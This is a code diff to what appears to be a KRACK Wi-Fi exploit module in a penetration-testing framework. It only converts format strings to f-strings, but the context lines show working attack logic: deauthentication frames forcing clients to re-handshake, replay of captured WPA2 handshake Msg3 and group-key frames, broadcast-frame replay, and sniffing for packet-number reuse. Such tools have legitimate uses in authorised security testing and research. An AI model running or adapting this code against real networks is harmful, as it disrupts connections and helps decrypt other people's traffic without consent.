@@ -228,7 +228,7 @@ class Exploit(Exploit):
 
     def _passive_monitor(self) -> None:
         """Passively monitor for KRACK indicators (IV/PN reuse, handshake replays)."""
-        print_status("Passive KRACK monitoring for {}s...".format(self.monitor_timeout))
+        print_status(f"Passive KRACK monitoring for {self.monitor_timeout}s...")
         handshake_count = {"msg1": 0, "msg3": 0, "group1": 0}
 
         def _analyze(pkt):
@@ -236,8 +236,7 @@ class Exploit(Exploit):
                 pn = _extract_pn(pkt)
                 reused = self._iv_tracker.observe(pkt.addr2, pn)
                 if reused:
-                    print_success("[KRACK] PN reuse detected: {} PN={}".format(
-                        pkt.addr2, pn))
+                    print_success(f"[KRACK] PN reuse detected: {pkt.addr2} PN={pn}")
 
             if _is_eapol_msg1(pkt):
                 handshake_count["msg1"] += 1
@@ -258,7 +257,7 @@ class Exploit(Exploit):
 
         print_info("\nHandshake messages observed:")
         for msg_type, count in handshake_count.items():
-            print_info("  {}: {}".format(msg_type, count))
+            print_info(f"  {msg_type}: {count}")
 
         stats = self._iv_tracker.get_stats()
         if stats:
@@ -292,12 +291,11 @@ class Exploit(Exploit):
             return
 
         msg3 = self._captured_msg3[-1]
-        print_status("Replaying Msg3 ({} times, interval={}s)...".format(
-            self.replay_count, self.replay_interval))
+        print_status(f"Replaying Msg3 ({self.replay_count} times, interval={self.replay_interval}s)...")
 
         for i in range(self.replay_count):
             sendp(msg3, iface=self.interface, verbose=False)
-            print_info("  Replay {} sent.".format(i + 1))
+            print_info(f"  Replay {i + 1} sent.")
             time.sleep(self.replay_interval)
 
         print_success("Msg3 replay complete. Monitor for PN resets on the client.")
@@ -325,7 +323,7 @@ class Exploit(Exploit):
             return
 
         group_msg = self._captured_group[-1]
-        print_status("Replaying Group Key Msg1 ({} times)...".format(self.replay_count))
+        print_status(f"Replaying Group Key Msg1 ({self.replay_count} times)...")
 
         for i in range(self.replay_count):
             sendp(group_msg, iface=self.interface, verbose=False)
@@ -359,7 +357,7 @@ class Exploit(Exploit):
             print_error("No broadcast frames captured.")
             return
 
-        print_status("Replaying {} broadcast frames...".format(len(captured)))
+        print_status(f"Replaying {len(captured)} broadcast frames...")
         for frame in captured:
             for _ in range(self.replay_count):
                 sendp(frame, iface=self.interface, verbose=False)
@@ -401,8 +399,7 @@ class Exploit(Exploit):
                 pn = _extract_pn(pkt)
                 reused = self._iv_tracker.observe(pkt.addr2, pn)
                 if reused:
-                    print_success("[FT-KRACK] PN reuse after FT: {} PN={}".format(
-                        pkt.addr2, pn))
+                    print_success(f"[FT-KRACK] PN reuse after FT: {pkt.addr2} PN={pn}")
 
         try:
             sniff(iface=self.interface, prn=_monitor_ft, store=False,
@@ -439,8 +436,7 @@ class Exploit(Exploit):
             addr3=self.target_bssid,
         ) / Dot11Deauth(reason=7)
 
-        print_status("Sending {} deauth frames to trigger re-handshake...".format(
-            self.replay_count))
+        print_status(f"Sending {self.replay_count} deauth frames to trigger re-handshake...")
 
         capture_thread = threading.Thread(target=self._capture_handshake_async,
                                           daemon=True)
@@ -455,8 +451,7 @@ class Exploit(Exploit):
         capture_thread.join(timeout=30)
 
         if self._captured_msg3:
-            print_success("Captured {} Msg3 frames after deauth trigger.".format(
-                len(self._captured_msg3)))
+            print_success(f"Captured {len(self._captured_msg3)} Msg3 frames after deauth trigger.")
         else:
             print_info("No Msg3 captured. Client may have moved or AP uses FT.")
 
@@ -512,12 +507,12 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_info("KRACK Attack Configuration:")
-            print_info("  Interface: {}".format(self.interface))
-            print_info("  Mode:      {}".format(self.attack))
-            print_info("  BSSID:     {}".format(self.target_bssid))
-            print_info("  Client:    {}".format(self.target_client))
-            print_info("  Channel:   {}".format(self.channel))
-            print_info("  Timeout:   {}s".format(self.monitor_timeout))
+            print_info(f"  Interface: {self.interface}")
+            print_info(f"  Mode:      {self.attack}")
+            print_info(f"  BSSID:     {self.target_bssid}")
+            print_info(f"  Client:    {self.target_client}")
+            print_info(f"  Channel:   {self.channel}")
+            print_info(f"  Timeout:   {self.monitor_timeout}s")
             return
 
         if self.attack != "monitor" and os.getuid() != 0:
